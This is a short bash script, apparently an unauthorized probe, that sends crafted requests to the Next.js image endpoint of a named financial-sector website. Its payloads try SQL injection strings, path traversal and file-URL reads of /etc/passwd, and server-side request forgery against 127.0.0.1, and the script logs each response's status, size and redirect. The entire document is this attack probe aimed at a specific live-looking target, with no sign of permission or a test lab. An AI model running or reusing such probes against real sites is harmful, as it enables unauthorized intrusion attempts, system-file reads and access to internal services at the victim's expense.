#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
B="https://www.infinitycapital.bh"
urls=(
"/_next/image?url=%2Ffoo.png&w=640&q=75"
"/_next/image?url=https%3A%2F%2Fexample.com%2Fa.png&w=640&q=75"
"/_next/image?url=%2Ffoo.png&w=640&q=75%27"
"/_next/image?url=%2Ffoo.png&w=640%27&q=75"
"/_next/image?url=%2Ffoo.png&w=640&q=75%22"
"/_next/image?url=%2Ffoo.png&w=640&q=99%27%20or%201=1--"
"/_next/image?url=%2Ffoo.png%3Fx%3D1%27&w=640&q=75"
"/_next/image?url=..%2F..%2F..%2Fetc%2Fpasswd&w=640&q=75"
"/_next/image?url=file%3A%2F%2F%2Fetc%2Fpasswd&w=640&q=75"
"/_next/image?url=http%3A%2F%2F127.0.0.1%2F&w=640&q=75"
)
for u in "${urls[@]}"; do
  echo "=== $u"
  curl -s -o /dev/null -w "code=%{http_code} size=%{size_download} redirect=%{redirect_url}\n" -A "$UA" "$B$u"
done
